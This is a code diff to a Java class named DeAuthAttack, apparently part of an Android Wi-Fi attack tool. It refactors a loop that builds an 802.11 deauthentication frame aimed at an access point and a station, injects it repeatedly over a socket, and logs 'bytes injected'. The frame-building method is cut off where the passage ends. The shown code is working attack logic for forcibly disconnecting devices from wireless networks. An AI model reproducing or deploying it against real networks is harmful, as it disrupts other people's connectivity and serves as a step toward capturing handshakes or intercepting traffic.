@@ -43,28 +43,35 @@ public class DeAuthAttack extends Attack {
     }
 
     @Override
-    public void doAttack() {
-        byte[] deAuthFrame = constructDeAuthFrame(getAp().getBssid(), stationMac);
-        FrameSender frameSender = new FrameSender();
+public void doAttack() {
+    byte[] deAuthFrame = constructDeAuthFrame(getAp().getBssid(), stationMac);
+    AttackInfoString attackInfoString;
 
-        for(int i = 0; i < amountOfPackets; i++) {
-            if(isCanceled)
-                break;
-            AttackInfoString infoString = FrameSender.sendSocket(deAuthFrame);
-            deauthUpdate(infoString.message, infoString.messageType);
-            try {
-                Thread.sleep(500);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+    for(int i = 0; i < amountOfPackets; i++) {
+        if(isCanceled)
+            break;
+
+        attackInfoString = new AttackInfoString();
+
+        if(FrameSender.sendViaSocket(deAuthFrame)) {
+            attackInfoString.message = deAuthFrame.length + " bytes injected!\n";
+            attackInfoString.messageType = AttackInfoString.ATTACK_UPDATE_SUCCESS;
+        } else {
+            attackInfoString.message = "Error, look at logcat!";
+            attackInfoString.messageType = AttackInfoString.ATTACK_UPDATE_ERROR;
+        }
+
+        updateAttackText(attackInfoString.message, attackInfoString.messageType, getGuid());
+
+        try {
+            Thread.sleep(500);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
         }
     }
+}
 
 
-    public void deauthUpdate(String updateText, int updateReason) {
-      updateAttackText(updateText, updateReason, getGuid());
-
-    }
 
     public static byte[] constructDeAuthFrame(String bssid, String station) {
         byte deauth_frame[] =
